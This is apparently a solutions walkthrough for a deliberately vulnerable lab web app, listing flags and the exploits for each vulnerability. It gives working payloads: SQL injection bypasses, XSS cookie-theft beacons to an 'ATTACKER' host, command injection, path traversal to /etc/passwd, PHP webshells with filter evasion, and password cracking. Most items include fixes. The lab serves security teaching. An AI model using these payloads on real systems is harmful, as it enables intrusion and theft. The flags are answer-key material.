---
tags: [css-exam, labs, solution, web]
---
# VulnCorp (app 1) — Solutions
> ↑ Lab Kit · method: Web Penetration Test Checklist

Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http://localhost:8000`.

## 🏁 Flags — one per vuln (track them on the 📊 Progress page)
| Vuln | Flag | How you get it |
|---|---|---|
| SQL injection | `FLAG{sql1_auth_byp4ss_and_1dor}` | UNION-dump / auth-bypass → admin's `private_note` |
| Reflected & Stored XSS | `FLAG{xss_st34ls_the_c00kie}` | steal the (non-HttpOnly) `flag` cookie via `document.cookie` |
| IDOR | `FLAG{sql1_auth_byp4ss_and_1dor}` | `profile.php?id=1` → admin's note |
| Command injection | `FLAG{c0mmand_1njection_rce_on_host}` | `;cat private/cmdi_flag.txt` via Net Tools |
| LFI / traversal | `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` | `?page=../../lfi_secret/flag.txt` |
| File upload | `FLAG{w3bshell_upl0ad_to_rce}` | webshell → `cat private/upload_flag.txt` |
| Info disclosure | `FLAG{c0nfig_backup_left_in_webroot}` | `GET /config.php.bak` |
| Weak creds | admin's note (above) | log in as `admin` with the cracked/guessed password |
| Weak CSP (+ cookie theft) | `FLAG{xss_st34ls_the_c00kie}` (via stored XSS) | DevTools → Network → Response Headers (CSP) + Console `document.cookie`; non-HttpOnly cookie + unsafe-inline |

## 1. SQL injection — auth bypass + UNION  (`login.php`, `index.php?q=`)
**Answer:** login is a string-concatenated query → bypass with a comment; search is injectable → UNION-dump every credential.
**Command:**
```
# auth bypass:
curl -s "$U/login.php" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
# dump all users via UNION on the directory search (3 cols: username,email,role) — passwords are now
# SALTED MD5, so pull the salt too (pack hash:salt into the middle/"email" column):
curl -sG "$U/home.php" --data-urlencode "q=' UNION SELECT username,CONCAT(password,0x3a,salt),role FROM users-- -"
```
**Result:** auth bypass logs in as admin → `FLAG{sql1_auth_byp4ss_and_1dor}` directly (no cracking needed).
The UNION now dumps `admin:7cc3c50b…:a7Fk2`, `alice:6cb1f927…:Lm9xQ`, … (`hash:salt`). Crack them:
```
# one hash:salt per line in hashes.txt, then md5(pass.salt) = hashcat mode 10:
hashcat -m 10 hashes.txt /usr/share/wordlists/rockyou.txt
# -> alice=password123, bob=letmein  (admin='S3ntinel!Admin' won't crack from rockyou,
#    but it's leaked in config.php.bak — see #9 — and the auth bypass above skips cracking entirely)
```
**Reason:** `"...WHERE username='$u' AND password=MD5(CONCAT('$p',salt))"` — `admin'-- -` closes the
string and comments out the whole password check, so the bypass is unaffected by the salting; the search
column count (3) matches so the UNION rows render. Salting only changes the *dump→crack* path: you must
dump each user's salt and crack per-hash — it does nothing against the injection or weak passwords.

## 2. Reflected XSS  (`index.php?q=`)
**Answer:** `q` is echoed into the HTML unencoded.
**Command:** `$U/index.php?q="><script>alert(document.domain)</script>`
**Result:** the script tag lands in the page and executes. **Reason:** no `htmlspecialchars()` on output.

## 3. Stored XSS  (guestbook on `index.php`)  — and "what can XSS actually do?"
**Answer:** the comment **body** is stored and rendered raw (the author is escaped — put the payload in the *message*).
**Confirm it runs:** post `<script>alert('stored xss')</script>` in the message → reload → it fires for every visitor.

**"How do I get information from it?"** XSS runs JS *as the victim*, so you can read their session/DOM and **exfiltrate** it. There's a non-HttpOnly `flag` cookie here to prove it — steal it:
```
# 1) start a listener on Kali to catch the stolen data:
python3 -m http.server 9001
# 2) post this as the guestbook MESSAGE (the payload beacons the victim's cookies to you):
<script>new Image().src='http://127.0.0.1:9001/steal?c='+encodeURIComponent(document.cookie)</script>
# 3) reload the guestbook -> your listener logs:  GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}
```
**Flag:** `FLAG{xss_st34ls_the_c00kie}` (arrives in your listener). **Result:** real cookie/session theft — in a live app that cookie would be the victim's login session. Other payloads: keylogging, making requests as the victim, defacing. **Reason:** `body` echoed without encoding.
> Reflected XSS (search box) steals the same cookie — the difference is stored = hits every visitor automatically; reflected = needs a crafted link.

## 4. IDOR  (`profile.php?id=`)
**Answer:** no ownership check — any `id` reveals that user's note + API key.
**Command:** `curl -s "$U/profile.php?id=1"`
**Result:** admin's record → `FLAG{sql1_auth_byp4ss_and_1dor}` + API key. **Reason:** object id trusted straight from the URL.
Per level the reference is obfuscated but always forgeable: `?id=1` (easy) · base64 `?id=MQ==` (medium) ·
md5 `?id=c4ca4238a0b923820dcc509a6f75849b` (hard) · **expert** the `?id` is ignored and the server trusts a
`uid` **cookie** — set `uid=1` (the Hub's "become uid=1" button sets it scoped to `/profile.php`, or add it
by hand in DevTools → Application → Cookies) and reload → admin.
Decode/crack reps: each record's `private_note` is encoded harder — id 1 plaintext flag · id 2 base64
(`base64 -d`) · id 3 unsalted sha1 (`hashcat -m 100` → `pepper`) · id 4 salted md5 `hash:salt`
(`hashcat -m 10` → `cookie`). Read all four via the IDOR.

## 5. Command injection  (`tools.php?host=`)
**Answer:** `host` is concatenated into a shell `ping`. The filter escalates the operator you need, and the
flag you read is encoded one step harder each level (plaintext → base64 → unsalted SHA-256 → salted md5):
```
# easy — raw, chain with ; :
curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1; cat private/cmdi_flag.txt"      # FLAG{c0mmand_1njection_rce_on_host}
# medium — ; & stripped -> pipe | ; flag is base64:
curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1 | cat private/cmdi_flag.b64" | base64 -d   # FLAG{cmdi_m3dium_base64_decoded}
# hard — ; & | ` + space stripped -> $(...) with ${IFS}; SHA-256 leaks in the ping error:
curl -sG "$U/tools.php" --data-urlencode 'host=127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)'
hashid '<64-hex>'; hashcat -m 1400 h.txt rockyou.txt                                      # -> butterfly
# expert — BLIND: exfiltrate to a readable file, then read it; salted md5 (hash:salt):
curl -sG "$U/tools.php" --data-urlencode "host=127.0.0.1; cat private/cmdi_flag.salted > uploads/pwn.txt"
curl -s "$U/uploads/pwn.txt"; hashcat -m 10 h.txt rockyou.txt                              # -> welcome
```
**Reason:** `shell_exec("ping -c 1 ".$host)` — no escaping; `$(...)` output leaks in ping's "name or service
not known" error, and the blind level forces write-then-read exfiltration.

## 6. LFI / path traversal  (`index.php?page=`)
**Answer:** `page` is included with no sanitisation, so `../` escapes the `pages/` directory.
Decode/crack reps: besides `flag.txt` (plaintext), the same out-of-webroot dir has `flag_b64.txt`
(`base64 -d`) and `flag_salted.txt` (`<md5>:<salt>` → `hashcat -m 10` → `monkey`); and the hard/expert
levels inherently return the file `php://filter`-encoded (base64 → decode; rot13 → decode).
**Command:**
```
# FLAG — a file OUTSIDE the web root, deterministic depth: only 2 ../ (extra ../ are harmless)
curl -sG "$U/index.php" --data-urlencode "page=../../lfi_secret/flag.txt"
# bonus: a system file — add ENOUGH ../ to reach / (depth depends on where the kit is installed,
#        and may be blocked by open_basedir); the flag above is the reliable target
curl -sG "$U/index.php" --data-urlencode "page=../../../../../../../etc/passwd"
```
**Result:** `FLAG{lf1_path_tr4versal_reads_files_outside_webroot}` (and, with enough `../`, `root:x:0:0:`).
**Reason:** `include __DIR__."/pages/".$page`; `lfi_secret/` is a sibling of `webapp/` (outside the docroot),
so it is reachable only via traversal and always at exactly 2 `../` from `pages/`.

## 7. Insecure file upload  (`upload.php`)
**Answer:** no extension/type check → upload a PHP webshell under the web root and run it.
**Command:**
```
echo '<?php system($_GET["c"]); ?>' > sh.php
curl -s -F "file=@sh.php" "$U/upload.php"
curl -s "$U/uploads/sh.php?c=id"
```
**Result:** `uid=...` → RCE. **Reason:** `move_uploaded_file` with the raw client filename, no validation; `uploads/` is servable.
Post-ex per level reads the flag in a harder form (webshell CWD is `uploads/`, so `../private/`):
```
cat ../private/upload_flag.txt                          # easy   -> FLAG{w3bshell_upl0ad_to_rce}
cat ../private/upload_flag.b64 | base64 -d              # medium -> FLAG{upl0ad_rce_b64_pivot}
cat ../private/upload_flag.md5                          # hard   -> <md5>  -> hashcat -m 0    -> sunshine
cat ../private/upload_flag.sha256salt                   # expert -> <sha256>:<salt> -> hashcat -m 1410 -> pokemon
```

## 8. Weak CSP + cookie theft  (every page)

**Answer:** the CSP is present but bypassable — `script-src 'unsafe-inline'` lets injected inline scripts
run, `img-src *` lets a beacon exfiltrate to any host, and the session/flag cookie is set **without
`HttpOnly`**, so JavaScript can read it. Chained with the stored XSS this steals the cookie:
`FLAG{xss_st34ls_the_c00kie}`.

**Command (read the header/cookie in the browser — no terminal needed):**
```
# 1. See the CSP:  DevTools (F12) -> Network -> reload (Ctrl+R) -> click "index.php" -> Response Headers
#      Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src *
# 2. See the cookie:  DevTools -> Console ->  document.cookie
#      flag=FLAG{xss_st34ls_the_c00kie}    (it's visible -> cookie has NO HttpOnly -> JS can read it)

# attacker listener (receives the stolen cookie in its access log)
python3 -m http.server 9001

# payload posted as a GUESTBOOK MESSAGE (stored XSS); runs in every viewer's browser
<script>new Image().src='http://ATTACKER:9001/steal?c='+document.cookie</script>
```
**Result:** on page load the listener logs `GET /steal?c=flag=FLAG{xss_st34ls_the_c00kie}`.

**Reason / how the payload is derived:**
- Stored XSS → arbitrary JS runs in viewers' browsers.
- `document.cookie` is readable because the cookie has **no `HttpOnly`** → there's a value worth stealing.
- Exfiltrate by making the browser request an attacker URL with the data in the query string.
- **Use an image beacon, not `fetch()`** — the CSP has `img-src *` (image to any host = allowed) but no
  `connect-src`, which falls back to `default-src 'self'` (so `fetch`/XHR to an external host = blocked).
  Reading the CSP tells you which exfil channel survives it.

**Impact:** session hijacking via XSS despite a CSP being deployed — a false sense of security.

**Remediation (any one breaks the chain):** drop `'unsafe-inline'` (use a nonce/hash); restrict `img-src`
to known hosts (and set `connect-src`); set the cookie **`HttpOnly; Secure; SameSite=Strict`** — `HttpOnly`
alone would have stopped the theft even with the weak CSP.

> Finding the headers (all in the browser):
> - **CSP:** DevTools (F12) → **Network** → reload (Ctrl+R) → click the document (`index.php`) → **Response Headers**.
> - **Cookie:** DevTools → **Console** → type `document.cookie` (or **Application/Storage → Cookies**).
> Request headers are what the browser sends; **CSP and Set-Cookie are response headers** (server → browser).

## 9. Information disclosure — exposed config backup leaks admin creds

**Answer:** a backup of the app config (`config.php.bak`) is left in the web root. Because `.bak` is
not executed by PHP it is served as plaintext source, leaking `ADMIN_PASS = S3ntinel!Admin` and
`API_SIGNING_KEY = sk_live_9f2c1a77d4b0e5f6a1b2c3d4`. `robots.txt` advertised the path.
Flag: `FLAG{c0nfig_backup_left_in_webroot}`.

**Leveled — the same credential, in a harder form each level** (discover the paths via the chain
`robots.txt` → `/.well-known/security.txt` → `/private/deployment-notes.txt`, which breadcrumbs the rest,
or fuzz `/private/` with feroxbuster/ffuf):
```
# easy   — plaintext in the config backup:
curl -s "$U/config.php.bak"                                        # ADMIN_PASS = S3ntinel!Admin
# medium — base64-encoded (file is pure base64, decode directly):
curl -s "$U/private/creds_medium.b64" | base64 -d                  # admin:Sup3rStaging!99
# hard   — unsalted hash -> identify + crack:
curl -s "$U/private/creds_hard.txt"                                # <sha1>
hashid '<sha1>'   # SHA-1 ; then:  hashcat -m 100 hash.txt rockyou.txt   -> chocolate
# expert — salted hash (hash:salt) -> crack with the matching mode:
curl -s "$U/private/creds_expert.txt"                              # <md5>:<salt>
hashcat -m 10 hash.txt rockyou.txt   # feed 'hash:salt' (md5(pass.salt))  -> liverpool
```
**Lesson:** "info disclosure" is rarely one plaintext file — leaked backups expose secrets at every
protection level; plaintext → base64 → unsalted → salted only changes *how much work* recovery takes,
not *whether* it's possible once a file that shouldn't be reachable is served at all.

**Discovery (how the path was found):** the app returns a page for almost every path, so plain
status-based busting is noisy and `robots.txt`/`uploads` get hidden (they 404). `feroxbuster` with
all status codes + link extraction surfaces them:
```
feroxbuster -u http://localhost:8000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# -> 200 config.php.bak ; 404 .well-known /private /uploads /pages   (the real paths)
```
(ffuf/gobuster work too once you filter the wildcard: `ffuf ... -ac` or `gobuster ... --exclude-length 3545,5577`.)

**Command:**
```
curl -s "$U/robots.txt"                          # map of "hidden" paths
curl -s "$U/config.php.bak"                       # served as PLAINTEXT -> ADMIN_PASS + API_SIGNING_KEY
curl -s "$U/.well-known/security.txt"             # points to the deployment notes
curl -s "$U/private/deployment-notes.txt"         # confirms creds are live
curl -s "$U/" | grep -i '<!--'                    # dev TODO comment
```

**Result:**
```
# robots.txt -> Disallow: /private/  /config.php.bak  /.well-known/
# config.php.bak ->
$ADMIN_USER      = 'admin';
$ADMIN_PASS      = 'S3ntinel!Admin';
$API_SIGNING_KEY = 'sk_live_9f2c1a77d4b0e5f6a1b2c3d4';
// FLAG{c0nfig_backup_left_in_webroot}
# deployment-notes.txt -> "credential rotation: pending (still S3ntinel!Admin)"
```
Then `admin : S3ntinel!Admin` logs in at `/login.php` → full admin.

**Reason:** `config.php` is executed by PHP (source never returned); the `.bak` copy has no PHP
handler so the server returns it verbatim. `robots.txt` is **not** access control — it only
enumerated the sensitive paths.

> Gotcha: opening `config.php.bak` in a **browser looks blank** — the browser hides `<?php … ?>` as an
> unknown processing-instruction tag. Use **View Source (Ctrl+U)** or `curl` to read it.

**Impact:** unauthenticated disclosure of the admin password + an API signing key → full compromise
and the ability to forge signed API requests.

**Remediation:** keep configs **outside** the web root; remove `*.bak`/`*.old`/`*~`/`*.swp`/`.git/`
from it; protect sensitive paths with auth (not `robots.txt`); rotate the exposed password and key.

## 10. Weak / default credentials  (`login.php`)
**Answer:** several accounts use guessable passwords.
**Command:** try `admin:S3ntinel!Admin`, `alice:password123`, `bob:letmein`, `svc_backup:Backup2024!` (or Hydra against the form).
**Reason:** weak password policy on service/user accounts.

---
## File artifacts (brief)
- **certs/bad-webmail.crt** → `openssl x509 -in bad-webmail.crt -noout -text`: self-signed (subject=issuer), **1024-bit**, **expired 2022→2023**, SAN has wildcard+IP = 3 flaws; a browser would reject it (untrusted + expired).
- **chain** → `openssl verify -CAfile root_ca.pem -untrusted intermediate_ca.pem server.pem` = OK; CRL: `openssl crl -in intermediate.crl -noout -text` (revoked list contains `revoked.pem`, not `server.pem`).
- **keys/encrypted_rsa** → crack passphrase: `ssh2john encrypted_rsa > h; john h --wordlist=rockyou.txt` → `Summer2024!`; derive pub: `ssh-keygen -y -f id_ed25519`.
- **email/phishing.eml** → `grep -aboF 'LS0tLS1CRUdJTiBPUEVOU1NI' phishing.eml` finds the key appended outside MIME; decode the trailing base64 → OpenSSH key. Headers: SPF=fail, dkim=none, Reply-To to a different domain.
- **network/*.pcap** → `tshark -r http_login_cleartext.pcap -z follow,tcp,ascii,0 -q` → `username=admin&password=S3ntinel!Admin`.
- **data/kpi_audit.db** → `sqlite3 kpi_audit.db "SELECT COUNT(DISTINCT user_id) FROM sessions WHERE substr(started_at,1,10)='2026-06-30'"` ≈ 130 vs claimed 24500 (overstated); exclude out-of-window July rows + decoy models/internal users.
- **data/medical_release.csv + voter_list.csv** → join on age+zip+gender: rows unique on those 3 quasi-identifiers (e.g. age 29/zip 8001/F appears >1 but 55/3011/M links to one name) → re-identify.
- **hashes/** → identify first (`hashid '<hash>'` / `hash-identifier`), then crack with the matching mode
  (`hashcat -m <n>` or `john --format=<fmt> --wordlist=rockyou.txt`):
  `md5.txt` -m 0 →password · `sha1.txt` -m 100 →dragon · `sha256.txt` -m 1400 →princess ·
  `md5_salted.txt` -m 10 (`hash:salt`) →baseball · `ntlm.txt` -m 1000 →welcome ·
  `bcrypt.txt` -m 3200 →football (slow — bcrypt's work factor) · `apr1_htpasswd.txt` -m 1600 →summer ·
  `sha512_shadow.txt` -m 1800 →hunter2. `mystery.txt` = 4 **unlabeled** hashes — identify each yourself
  (md5→monkey, sha256→iloveyou, ntlm→sunshine, sha1→superman).

---
# 🧠 Why each bypass works — mechanism & examples

The walkthroughs above give the *payloads*. This section explains **the vulnerable code, why it's
exploitable, and — level by level — why each bypass defeats that level's defence.** The recurring theme:
these defences are **blacklists** (string-replace filters), and a blacklist can always be beaten by
*reconstructing* the blocked token **after** the filter has run (nesting, encoding, a different sink).

## 1. SQL injection — the query is built from strings
**Mechanism.** Input is concatenated straight into SQL:
```
login :  "...WHERE username='$u' AND password=MD5(CONCAT('$p',salt))"
search:  "...WHERE name LIKE '$q%'"        -- 3 output columns (name, category, price)
```
Your input breaks out of the `'...'` string and becomes *code*.

**Login auth-bypass — per level** (filter `f_login`):
```
easy    admin'-- -                    the ' closes the username string; -- - comments out the rest
                                        (the whole "AND password=…" check is gone) → first row = admin
medium  admin' or '1'='1              comments (-- , --, #) are stripped → don't use one.
                                        '...username='admin' or '1'='1'...' is always TRUE → admin row
hard    admin' oorr '1'='1            'or' is now stripped too. The filter removes the INNER "or"
                                        from o(or)r → the halves rejoin into "or" AFTER filtering
expert  admin'/**/oorr/**/'1'='1      spaces stripped → /**/ is a valid SQL token-separator ("space")
```
*Why each step works:* the filter is a one-pass string replace. **Nesting** (`oorr`, `UNIunionON`) puts
the keyword back together once the inner copy is deleted; **`/**/`** is whitespace to the SQL parser.

**Search UNION — per level** (filter `f_sqli`):
```
easy    ' UNION SELECT username,password,role FROM users-- -
medium  ' UNIunionON SELselectECT …          'union'/'select' stripped ONCE → nest them
hard    '/**/UNIunionON/**/SEL…/**/…#         spaces also stripped → /**/ ; close with #
expert  ' OR (SELECT SUBSTRING(v,1,1) …)='F'  rows are SUPPRESSED → UNION shows nothing, go BLIND:
                                                ask yes/no per character (boolean/time), or use sqlmap
```
**Fix:** parameterised queries / prepared statements — data never becomes code, so no filter is needed.

## 2 & 3. Reflected / Stored XSS — output is not encoded
**Mechanism.** Your input is written into the HTML response verbatim (reflected = the search echo;
stored = the guestbook **body** — the *author* field is escaped, so the payload goes in the message).
The browser can't tell your injected markup from the app's → it executes.

**Per level** (filter `f_xss`) — each level blocks the *previous* sink, so you switch to another one that
also auto-executes:
```
easy    <script>alert(document.cookie)</script>
medium  <img src=x onerror=alert(document.cookie)>      '<script' is stripped → use an event handler
hard    <svg onload=alert(document.cookie)>             'onerror' stripped → a different handler
expert  <svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>   'onload' stripped too
```
*Why it keeps working:* there are **dozens** of tags/attributes that run JS (`onerror`, `onload`,
`onbegin`, `onfocus`, `onpointerover`, …). A blacklist can never name them all — that's why the fix is
**output-encoding**, not banning strings.

**What XSS actually gets you (the "how do I get info from it" part).** XSS runs JS **as the victim**, so
you read their session/DOM and **exfiltrate** it:
```
<script>new Image().src='http://ATTACKER:9001/?c='+document.cookie</script>
```
It works here because the `flag` cookie has **no `HttpOnly`** (JS can read it) and you beacon it out with
an `<img>` (see §8 for why an image, not `fetch`). Stored = fires for every visitor automatically;
reflected = needs the victim to open your crafted link.
**Fix:** `htmlspecialchars()` on output (context-aware encoding) + `HttpOnly` cookies.

## 4. IDOR — a reference with no authorisation check
**Mechanism.** The record is selected by an identifier taken **from the request**, and the server never
checks *whether the current user is allowed to see that record*. So you just name someone else's object.
```
easy    profile.php?id=1
medium  profile.php?id=MQ==                      id is base64 → decode/encode (MQ== = "1")
hard    profile.php?id=c4ca4238a0b923820dcc509a6f75849b   id is md5("1") → md5 of small ints is guessable
expert  (?id ignored) set cookie uid=1           the trusted reference moved to a cookie you control
```
*Why each works:* every level only **obfuscates the reference** (base64, md5, cookie) — none of them is a
**permission**. Obfuscation ≠ access control; the reference is always forgeable.
**Fix:** server-side authorisation — "does *this session* own *this object*?" — not a guessable id.

## 5. Command injection — input reaches a shell
**Mechanism.** `shell_exec("ping -c 1 ".$host)` — your input is part of a shell command line, so shell
metacharacters start a **second** command.
**Per level** (filter `f_cmd`) — each level removes one way to chain, the shell offers another:
```
easy    127.0.0.1; cat private/cmdi_flag.txt           ; = command separator
medium  127.0.0.1 | cat private/cmdi_flag.b64          ; and & stripped → pipe |
hard    127.0.0.1$(cat${IFS}private/cmdi_flag.sha256)  ; & | ` and SPACES stripped →
                                                          $(...) substitution; ${IFS} = the shell's
                                                          whitespace separator, used in place of a space
expert  …> uploads/pwn.txt  then read it               output isn't returned (blind) → write to a file
                                                          you can fetch (or DNS/time exfil)
```
*Why `${IFS}`:* `IFS` (Internal Field Separator) expands to whitespace, so the command still parses when
literal spaces are banned. *Why blind exfil:* if you can't see stdout, redirect it somewhere readable.
**Fix:** never build a shell string from input — pass an **argument array** (`exec`-style) or
`escapeshellarg`, or use a native API with no shell.

## 6. LFI / path traversal — a user string becomes a file path
**Mechanism.** `include __DIR__."/pages/".$page` → `../` climbs out of `pages/`.
**Per level** (filter `f_lfi`):
```
easy    ../../lfi_secret/flag.txt                        raw traversal
medium  ....//....//lfi_secret/flag.txt                  '../' stripped ONCE → "....//" collapses to
                                                            "../" after the single pass
hard    php://filter/convert.base64-encode/resource=db.php   '../' stripped RECURSIVELY ("....//" dies) →
                                                            you can't traverse; a php:// wrapper reads a
                                                            file in place. base64 because a .php file
                                                            would otherwise EXECUTE — you want its SOURCE
expert  php://filter/read=string.rot13/resource=db.php   'base64' now blocked → a different converter
```
*How you'd know `db.php` exists:* first base64-read a page you're **sure** is there (`resource=home.php`
or `resource=index.php`) and read its `require/include` lines — they name the other files. Or fuzz
`db.php`/`config.php`.
**Fix:** don't build include paths from input; allow-list page names; `realpath()` + check it stays under
`pages/`; disable stream wrappers you don't need.

## 7. Insecure upload — the server runs what you upload
**Mechanism.** `move_uploaded_file` keeps your filename, does no content/extension check, and `uploads/`
is **servable + PHP-executable** → upload `sh.php` and request it.
**Per level** (content filter `upload_reject`) — the blacklist bans one function name, you use another:
```
easy    <?php system($_GET['c']); ?>
medium  <?php passthru($_GET['c']); ?>              'system' blocked → passthru
hard    <?php echo `{$_GET['c']}`; ?>               exec-family blocked → backticks
expert  <?php $f='sy'.'stem'; $f($_GET['c']); ?>    backticks blocked → build the name at runtime
                                                      (the filter matches literal substrings; 'sy'.'stem'
                                                      isn't the literal string "system" in the source)
```
**Fix:** allow-list by real content type/extension, store uploads **outside** the webroot (or on a host
that never executes them), randomise names.

## 8. Weak CSP + cookie theft — a CSP that doesn't actually protect
**Mechanism.** A CSP *is* sent, but it's permissive, and it's chained with the stored XSS:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; img-src *
```
- `script-src 'unsafe-inline'` → your injected inline `<script>`/handler is **allowed to run**.
- cookie set **without `HttpOnly`** → JS can read `document.cookie` (there's something worth stealing).
- **Why an `<img>` beacon, not `fetch()`:** `img-src *` allows loading an image from *any* host (your
  exfil channel), but there's no `connect-src`, so it **falls back to `default-src 'self'`** → `fetch`/XHR
  to an external host is **blocked**. Reading the CSP tells you which channel survives it.
**Fix (any one breaks the chain):** drop `'unsafe-inline'` (nonce/hash), set `connect-src`/tighten
`img-src`, and set the cookie `HttpOnly; Secure; SameSite=Strict` — `HttpOnly` alone defeats this even
with the weak CSP.

## 9. Information disclosure — a backup served as source
**Mechanism.** `config.php` is executed by PHP (you never see its source), but a left-behind
**`config.php.bak`** has no PHP handler, so the server returns it **verbatim** → the admin password and an
API key leak. `robots.txt` merely *listed* the paths — it is **not** access control (it's a map for
attackers). Per level the same secret is just encoded harder (plaintext → base64 → unsalted → salted),
which changes recovery *cost*, not *reachability*.
*Browser gotcha:* `config.php.bak` looks **blank** in a browser (it hides `<?php … ?>` as an unknown tag)
— use **View Source (Ctrl+U)** or `curl`.
**Fix:** keep configs outside the webroot; delete `*.bak`/`*.old`/`*~`/`.git/`; protect paths with auth,
not `robots.txt`; rotate any leaked secret.

## 10. Weak / default credentials
**Mechanism.** Real accounts use guessable passwords (`admin:S3ntinel!Admin`, `alice:password123`, …),
so an online guess / Hydra run (or the config leak in §9) gets you in — no "exploit" required.
**Fix:** strong password policy, rate-limiting/lockout, MFA; never ship default or reused credentials.
